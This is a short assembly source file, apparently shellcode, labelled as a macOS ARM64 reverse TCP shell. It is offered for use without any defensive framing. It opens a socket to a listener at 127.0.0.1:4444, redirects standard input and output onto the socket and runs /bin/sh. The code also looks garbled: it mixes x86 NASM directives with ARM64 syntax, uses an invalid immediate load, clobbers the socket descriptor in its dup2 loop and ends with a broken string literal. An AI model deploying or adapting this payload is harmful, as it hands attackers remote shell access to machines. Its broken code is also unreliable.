; Title:    macOS ARM64 reverse TCP shell
; Platform: macos
; Arch:     arm64
; Size:     ~120 bytes
; Encoding: raw
;
; Assembled hex:
; ; see assembled bytes

BITS 64
global _start

_start:
    ; macOS ARM64 reverse shell to LHOST:LPORT
    ; Syscall numbers: socket=97, connect=98, dup2=90, execve=59
    ; macOS uses 0x2000000 | syscall_num in x16

    ; socket(AF_INET=2, SOCK_STREAM=1, 0)
    mov     x0, #2
    mov     x1, #1
    mov     x2, #0
    mov     x16, #97
    movk    x16, #0x2000, lsl#16
    svc     #0x80               ; x0 = sockfd

    ; connect(sockfd, {AF_INET, 4444, 127.0.0.1}, 16)
    mov     x4, x0
    sub     sp, sp, #16
    mov     x1, #0x5c11         ; port 4444 big-endian
    strh    w1, [sp, #2]
    mov     x1, #2
    strh    w1, [sp]            ; sin_family = AF_INET
    mov     x1, #0x7f000001     ; 127.0.0.1
    str     w1, [sp, #4]
    mov     x0, x4
    mov     x1, sp
    mov     x2, #16
    mov     x16, #98
    movk    x16, #0x2000, lsl#16
    svc     #0x80

    ; dup2(sockfd, 0), (sockfd, 1), (sockfd, 2)
    mov     x0, x4
    mov     x1, #0
dup_loop:
    mov     x16, #90
    movk    x16, #0x2000, lsl#16
    svc     #0x80
    add     x1, x1, #1
    cmp     x1, #3
    blt     dup_loop

    ; execve("/bin/sh", NULL, NULL)
    sub     sp, sp, #16
    adr     x0, sh_str
    str     x0, [sp]
    mov     x0, sp
    mov     x1, xzr
    mov     x2, xzr
    mov     x16, #59
    movk    x16, #0x2000, lsl#16
    svc     #0x80

sh_str:     .asciz "/bin/sh\" 
